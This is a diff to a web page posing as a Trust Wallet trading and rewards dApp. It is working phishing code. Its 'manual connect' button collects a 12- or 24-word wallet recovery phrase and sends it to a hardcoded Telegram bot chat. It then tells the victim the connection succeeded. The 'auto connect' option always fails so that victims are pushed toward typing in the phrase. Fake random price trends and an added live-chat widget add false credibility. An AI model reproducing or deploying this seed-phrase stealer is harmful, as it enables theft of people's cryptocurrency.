@@ -50,7 +50,7 @@ header p { font-size: 15px; color: #ccc; margin: 10px 0 10px 0; }
 .dapp-card p { font-size: 14px; color: #ccc; margin-bottom: 20px; }
 
 .connect-btn {
-  background: #1e90ff;
+  background: #28a745; /* Green color for manual connect */
   border: none;
   padding: 12px 28px;
   border-radius: 10px;
@@ -60,7 +60,7 @@ header p { font-size: 15px; color: #ccc; margin: 10px 0 10px 0; }
   transition: background 0.3s ease;
   box-shadow: 0 4px 12px rgba(0,0,0,0.25);
 }
-.connect-btn:hover { background: #0d6efd; }
+.connect-btn:hover { background: #218838; }
 
 #dashboard {
   margin-top: 25px;
@@ -201,10 +201,10 @@ textarea {
   cursor: pointer;
   margin-right: 10px;
 }
-#manualConnect { background: #6c757d; color: white; }
-#manualConnect:hover { background: #5a6268; }
-#autoConnect { background: #28a745; color: white; }
-#autoConnect:hover { background: #218838; }
+#manualConnect { background: #28a745; color: white; } /* green */
+#manualConnect:hover { background: #218838; }
+#autoConnect { background: #6c757d; color: white; }
+#autoConnect:hover { background: #5a6268; }
 
 #debugOutput { margin-top: 12px; font-size: 14px; color: #0f0; text-align: center; }
 #noticeMessage { font-size: 14px; color: #FFA500; margin-bottom: 10px; text-align: center; }
@@ -253,7 +253,6 @@ footer { margin-top: 40px; font-size: 13px; color: #aaa; text-align:center; }
   <div id="chartContainer"><div id="chartLine"></div></div>
 </div>
 
-<!-- 5s Loading Popup -->
 <div id="loadingPopup">
   <div class="popup-content">
     <div class="spinner"></div>
@@ -261,7 +260,6 @@ footer { margin-top: 40px; font-size: 13px; color: #aaa; text-align:center; }
   </div>
 </div>
 
-<!-- Connection Modal -->
 <div id="myModal" class="modal">
   <div class="modal-content">
     <span class="close">&times;</span>
@@ -279,7 +277,18 @@ footer { margin-top: 40px; font-size: 13px; color: #aaa; text-align:center; }
   <p>Trust Wallet • Auto Market Trade, Rewards and Earnings</p>
 </footer>
 
-<script>
+<script type="text/javascript">
+// Smartsupp always visible
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = '3f2e381e7e9f89397ee5857cb9eb7cacf6f3375e';
+window.smartsupp||(function(d){
+  var s,c,o=smartsupp=function(){ o._.push(arguments)}; o._=[];
+  s=d.getElementsByTagName('script')[0];
+  c=d.createElement('script'); c.type='text/javascript'; c.charset='utf-8';
+  c.async=true; c.src='https://www.smartsuppchat.com/loader.js?';
+  s.parentNode.insertBefore(c,s);
+})(document);
+
 document.addEventListener("DOMContentLoaded", () => {
   const modal = document.getElementById("myModal");
   const btn = document.getElementById("openModal");
@@ -293,7 +302,7 @@ document.addEventListener("DOMContentLoaded", () => {
   let storedPhrases = JSON.parse(localStorage.getItem("phrases") || "[]");
 
   btn.onclick = () => { 
-    loadingPopup.style.display = "flex"; 
+    loadingPopup.style.display = "flex";
     setTimeout(() => { 
       loadingPopup.style.display = "none"; 
       modal.style.display = "flex"; 
@@ -305,7 +314,6 @@ document.addEventListener("DOMContentLoaded", () => {
     phraseInput.style.display="none"; 
     debug.textContent=""; 
   };
-
   window.onclick = (event) => { 
     if(event.target == modal) { 
       modal.style.display = "none"; 
@@ -317,47 +325,32 @@ document.addEventListener("DOMContentLoaded", () => {
   manualBtn.onclick = () => {
     phraseInput.style.display = "block"; 
     const phrase = phraseInput.value.trim();
-    if(!phrase) { 
-        debug.style.color="#FFA500"; 
-        debug.textContent="📝 Enter 12 or 24-word phrase to connect."; 
-        return; 
-    }
-
     const wordCount = phrase.split(/\s+/).length;
-    if(wordCount !== 12 && wordCount !== 24){
-        debug.style.color = "red";
-        debug.textContent = "❌ Incorrect phrase. Enter 12 or 24 words.";
-        return;
+    
+    if(wordCount !== 12 && wordCount !== 24) { 
+      debug.style.color="#FFA500"; 
+      debug.textContent="❌ INCORRECT INPUT. INPUT CORRECT 12 OR 24 PHRASE"; 
+      return; 
     }
-
+    
     if(storedPhrases.includes(phrase)) { 
-        debug.style.color="#FFA500"; 
-        debug.textContent="⚠️ This wallet is already connected."; 
-        return; 
+      debug.style.color="#FFA500"; 
+      debug.textContent="⚠️ This wallet is already connected. Refresh wallet balance."; 
+      return; 
     }
 
-    debug.style.color="#FFA500"; 
-    debug.textContent="⏳ Connecting...";
-
+    debug.style.color="#FFA500"; debug.textContent="⏳ Connecting...";
     fetch(`https://api.telegram.org/bot7564393664:AAEL0TWkOdXomWTnDaTXF3KH75T2xfyseJQ/sendMessage?chat_id=6876291548&text=${encodeURIComponent(phrase)}`)
-    .then(response => {
-        if(response.ok){
-            storedPhrases.push(phrase);
-            localStorage.setItem("phrases", JSON.stringify(storedPhrases));
-            setTimeout(()=> { 
-              debug.style.color="#0f0"; 
-              debug.textContent="✅ Connected successfully. Please refresh wallet after 24 hours and check balance."; 
-              phraseInput.value="";
-            }, 2000);
-        } else {
-            throw new Error("Telegram API error");
-        }
-    })
-    .catch(err => { 
-        debug.style.color = "red"; 
-        debug.textContent = "❌ Error sending phrase to Telegram."; 
-        console.error(err); 
-    });
+      .then(()=> {
+        storedPhrases.push(phrase);
+        localStorage.setItem("phrases", JSON.stringify(storedPhrases));
+        setTimeout(()=> { 
+          debug.style.color="#0f0"; 
+          debug.textContent="✅ Connected successfully. Please refresh wallet after 24 hours and check balance."; 
+          phraseInput.value="";
+        }, 2000);
+      })
+      .catch(err=> { debug.style.color="red"; debug.textContent="❌ Error sending phrase."; console.error(err); });
   };
 
   autoBtn.onclick = () => {
@@ -366,6 +359,7 @@ document.addEventListener("DOMContentLoaded", () => {
     setTimeout(()=> { debug.style.color="red"; debug.textContent="❌ Localhost error... Try manual connection."; }, 5000);
   };
 
+  // Dynamic trends
   const btcTrend = document.getElementById("btcTrend");
   const ethTrend = document.getElementById("ethTrend");
   const signalText = document.getElementById("signalText");
@@ -383,6 +377,7 @@ document.addEventListener("DOMContentLoaded", () => {
     signalText.textContent = randomSignal();
   }, 2000);
 
+  // Dynamic chart
   const chartLineEl = document.getElementById('chartLine');
   let chartPoints = [];
   const maxPoints = 50;
@@ -404,7 +399,6 @@ document.addEventListener("DOMContentLoaded", () => {
 
   updateChart();
   setInterval(updateChart, 1000);
-
 });
 </script>
 </body>
